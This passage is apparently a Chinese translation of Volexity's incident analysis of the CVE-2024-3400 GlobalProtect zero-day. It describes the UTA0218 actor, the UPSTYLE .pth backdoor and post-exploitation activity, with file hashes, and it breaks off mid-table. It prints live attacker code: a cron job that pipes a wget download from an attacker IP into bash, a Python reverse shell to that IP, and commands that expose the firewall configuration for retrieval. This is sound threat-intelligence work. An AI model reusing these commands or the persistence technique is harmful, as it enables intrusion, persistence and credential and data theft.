#  GlobalProtect 中未经身份验证的远程代码执行漏洞的0day利用 (CVE-2024-3400)   
 Ots安全   2024-04-14 15:07  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
2024 年 4 月 10 日，Volexity 发现其一名网络安全监控 (NSM) 客户对 Palo Alto Networks PAN-OS GlobalProtect 功能中发现的漏洞进行了零日利用。Volexity 收到有关来自客户防火墙的可疑网络流量的警报。随后的调查确定该设备已被破坏。第二天，即 2024 年 4 月 11 日，Volexity 进一步观察到同一威胁行为者对其另一名 NSM 客户进行了相同的利用。  
  
Volexity 以别名 UTA0218 跟踪的威胁参与者能够远程利用防火墙设备、创建反向 shell 并将更多工具下载到设备上。攻击者专注于从设备导出配置数据，然后利用它作为在受害者组织内横向移动的入口点。  
  
Volexity 与其客户和 Palo Alto Networks 产品安全事件响应团队 (PSIRT) 密切合作，调查受损的根本原因。通过此次合作调查，Palo Alto Networks PSIRT 团队确认该漏洞为操作系统命令注入问题，并将其分配为 CVE-2024-3400。该问题是一个未经身份验证的远程代码执行漏洞，CVSS 基本评分为 10.0。Palo Alto Networks 此后发布了针对 CVE-2024-3400 的公告，其中包括有关向客户发布的威胁保护签名的信息，以及修复时间表（截至撰写本文时预计将于 2024 年 4 月 14 日修复）。  
  
在调查过程中，Volexity 观察到 UTA0218 试图在防火墙上安装自定义 Python 后门（Volexity 称之为 UPSTYLE）。UPSTYLE 后门允许攻击者通过特制的网络请求在设备上执行其他命令。有关此后门的详细信息将进一步包含在本报告中。  
  
随着 Volexity 扩大调查范围，它发现自 2024 年 3 月 26 日以来，多个其他客户和组织都成功利用了该漏洞。这些尝试似乎是威胁行为者通过在防火墙设备上放置零字节文件来验证可利用性来测试漏洞。2024 年 4 月 7 日，Volexity 观察到攻击者尝试在客户的防火墙设备上部署后门，但未能成功。三天后，即 2024 年 4 月 10 日，UTA0218被发现利用防火墙设备成功部署恶意负载。Volexity 于 2024 年 4 月 11 日观察到的第二次妥协遵循了几乎相同的剧本。与该发现和后续活动相关的时间表如下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadwXhVxChXw7TP0z6nXAjibqfGLPoibjpvrD0eoG9PWog0aOyGrCoBsOLdiaZYTyhvLP1SJNqIaH0KSQ/640?wx_fmt=png&from=appmsg "")  
  
成功利用设备后，UTA0218 从他们控制的远程服务器下载了额外的工具，以便于访问受害者的内部网络。他们迅速在受害者的网络中横向移动，提取敏感凭证和其他文件，以便在入侵期间和之后可能进行访问。攻击者所采用的情报技术和速度表明，威胁行为者能力很强，并且拥有清晰的剧本，知道如何访问以进一步实现其目标。Volexity 目前无法对正在发生的开采规模进行估计。防火墙设备的利用以及随后的键盘操作活动很可能是有限的和有针对性的。然而，如前所述，在撰写本文时，似乎确实发生了涉及旨在识别易受攻击系统的更广泛利用的潜在侦察活动的证据。  
  
Volexity 强烈建议使用 Palo Alto Networks GlobalProtect 防火墙设备的组织阅读该公告，以确保其防火墙设备具有正确的保护措施，或者采取缓解措施以确保它们不再容易受到攻击。与往常一样，应该注意的是，这些缓解措施和修复不会修复现有的妥协。受影响的组织应迅速调查其系统和网络是否存在潜在漏洞。  
  
这篇博文描述了攻击者添加到受感染设备中的恶意软件、观察到的横向移动尝试，以及组织可以用来识别其网络潜在危害的方法。  
  
**分析**  
  
**调查总结**  
  
Volexity 使用来自其自己的网络安全传感器、客户端端点检测、响应 (EDR) 软件的遥测数据以及从多个系统收集的取证数据来全面了解攻击者在所调查事件中的行为。  
  
以下是 Volexity 在调查过程中观察到的要点：  
- 零日利用 Palo Alto Global Protect 防火墙设备中的漏洞，允许未经身份验证的远程代码执行。最初的利用是创建反向 shell、下载工具、窃取配置数据以及在网络内横向移动。  
  
- 威胁行为者开发并尝试部署一种基于 Python 的新型后门，Volexity 称之为 UPSTYLE。  
  
- 迄今为止，Volexity 观察到的最早的企图利用漏洞的证据是在 2024 年 3 月 26 日，当时攻击者似乎验证了漏洞利用工作正常进行。  
  
- UTA0218 设置的初始持久性机制涉及配置一个 cron 作业，该作业将用于wget从攻击者控制的 URL 检索有效负载，并将其输出写入stdout并通过管道输送到 bash 执行。攻击者利用该方法部署并执行特定命令并下载GOST（GO Simple Tunnel）等反向代理工具。  
  
- 在一种情况下，攻击者使用配置供帕洛阿尔托防火墙使用的服务帐户和域管理员组的成员通过 SMB 和 WinRM 在受影响的网络中进行内部旋转。  
  
- UTA0218 的最初目标是通过获取 NTDS.DIT 文件来获取域备份 DPAPI 密钥并定位活动目录凭据。他们进一步针对用户工作站窃取保存的 cookie 和登录数据以及用户的 DPAPI 密钥。  
  
 上面总结的项目的详细描述可以在以下部分中找到。  
  
**UPSTYLE后门**  
  
在两个案例中，我们观察到 UTA0218 试图下载并执行名为 UPSTYLE 的后门 Volexity。观察到该工具有两个细微的变化，文件之间只有微小的差异。在一种情况下，UTA0218 使用的文件名是update.py. UTA0218 尝试通过 CVE-2024-3400 下载并执行该文件，但未成功。然而，Volexity 仍然能够恢复该文件进行分析。  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">update.py</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">5.1KB (5187 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/plain</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);word-break: break-all;"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">0c1554888ce9ed0da1583dbdf7b31651</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">988fc0d23e6e30c2c46ccec9bbff50b7453b8ba9</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
update.py 脚本的目的是将后门部署到以下路径：/usr/lib/python3.6/site-packages/system.pth。该后门以 Python 编写，以 an 开头import，其主要内容存储为 Base64 编码的 blob。该.pth扩展用于将附加路径附加到 Python 模块。从 Python 3.5 版本开始，.pth文件中以文本“ ”开头，后跟空格或制表符的行将按照官方文档import中的描述执行。因此，通过创建此文件，每次设备上的任何其他代码尝试导入该模块时，都会执行恶意代码。  
  
攻击者通过请求包含特定模式的不存在的网页来伪造要执行的命令。后门的目的是解析 Web 服务器错误日志 ( /var/log/pan/sslvpn_ngx_error.log) 来查找模式，并解析和解码添加到不存在的 URI 的数据，执行其中包含的命令。然后，命令输出将附加到 CSS 文件中，该文件是防火墙 ( /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css) 的合法部分。  
  
命令执行完成并写入输出后，最初读取并包含该命令的日志条目将从文件中删除sslvpn_ngx_error.log。执行十五秒后，原来的版本bootstrap.min.css也恢复到之前的状态。两个文件的访问和修改时间戳也会恢复。图 1 显示了 UPSTYLE 主循环。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadwXhVxChXw7TP0z6nXAjibqpuAicxez43mOJOpr2Ly2Y7uBn79xHhXAfnsA5l8lp7u4Dbl5SOCvPHA/640?wx_fmt=png&from=appmsg "")  
  
图 1. UPSTYLE 主循环  
  
该恶意软件的整体工作流程如图2所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadwXhVxChXw7TP0z6nXAjibq5sEfaUHEtbQzXyxhqfXt3XNE5GvKiciajbQRppkl77lqkeocBnUo61cw/640?wx_fmt=png&from=appmsg "")  
  
图 2. UPSTYLE 工作流程  
  
**开发后活动**  
  
出于本博文的目的，以下文件名和指示器与 2024 年 4 月 10 日发生的利用相关。但是，读者应该注意，在随后的利用中，这些文件被 UTA0218 针对不同的受害者进行了更改。然而，它们的目的和操作基本上是相同的。  
  
利用漏洞后，威胁行为者通过不断获取并执行名为 的文件的内容来建立持久性patch。执行时，此文件会下载并执行名为policy.通过修改文件的内容policy，威胁参与者能够在受感染的设备上执行各种命令。policyVolexity总共观察到了文件的六种不同排列。  
  
该文件的详细信息patch如下所示：  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">patch</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">160.0B (160 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/plain</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">d31ec83a5a79451a46e980ebffb6e0e8</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">a7c6f264b00d13808ceb76b3277ee5461ae1354e</span></p></td></tr><tr style="appearance: none;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">35a5f8ac03b0e3865b3177892420cb34233c55240f452f00f9004e274a85703c</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);word-break: break-all;"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="312" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
补丁文件内容如下所示：  
```
if [ ! -f '/etc/cron.d/update' ]; then
printf "SHELL=/bin/bash\n\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\n\n" > /etc/cron.d/update
fi
```  
  
执行时，它会检查是否存在名为update.如果此 cron 文件不存在，它将创建该文件并使用它来建立 cron 作业。它还policy每 60 秒下载一个名为 的远程托管文件并通过 bash 执行它。然后，攻击者随着时间的推移手动更新远程文件的内容，以从设备检索数据并创建反向 shell。  
  
有趣的是，攻击者似乎手动管理此命令和控制（C2）服务器的访问控制列表，因为除了与其通信的设备之外，无法从任何位置在同一端口上访问它。  
  
**通过策略文件执行的恶意代码**  
  
policyVolexity 观察到该文件的六个不同版本。它们各自代表威胁行为者在受感染设备上采取的一组不同操作。下面的编号版本是威胁行为者使用它们的顺序。  
  
**版本1**  
  
该文件包含一个用 Python 编写的单行反向 shell。  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">287B (287 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">a43e3cf908244f85b237fdbacd8d82d5</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">e1e427c9b46064e2b483f90b13490e6ef522cc06</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">755f5b8bd67d226f24329dc960f59e11cb5735b930b4ed30b2df77572efb32e8</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
```
#!/bin/bash
r=`ps -ef | grep "import sys,socket,os" | grep -v grep`
if [[ -z "$r" ]]; then
    python -c "import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"
fi
```  
  
**版本2**  
  
攻击者删除了之前创建的包含各种攻击者命令输出的 CSS 文件，然后将配置数据从防火墙设备复制到新文件中，并将设备的主机名存储在 CSS 文件中。这些文件被保存到外部可访问的 Web 目录中，攻击者随后可以在其中检索它们。  
  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">216B (216 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">5e4c623296125592256630deabdbf1d2</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">d12b614e9417c4916d5c5bb6ee42c487c937c058</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">adba167a9df482aa991faaa0e0cde1182fb9acfbb0dc8d19148ce634608bab87</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="470" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
```
#!/bin/bash
rm -f /var/appweb/sslvpndocs/global-protect/*.css
cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/<redacted>.css
uname -a > /var/appweb/sslvpndocs/global-protect/<redacted>.css
```  
  
**版本3**  
  
该文件用于删除上一步中创建的 CSS 文件。  
  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">62B (62 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">87312a7173889a8a5258c68cac4817bd</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">3ad9be0c52510cbc5d1e184e0066d14c1f394d4d</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">c1a0d380bf55070496b9420b970dfc5c2c4ad0a598083b9077493e8b8035f1e9</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
```
#!/bin/bash
rm -f /var/appweb/sslvpndocs/global-protect/*.css
```  
  
**版本4**  
  
该版本尝试下载名为GOST 的Golang 隧道工具，并使用两个不同的命令行选项执行它来建立 SOCKS5 和 RTCP 隧道。然而，威胁参与者此次尝试似乎未能成功下载该工具。  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">388B (388 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: 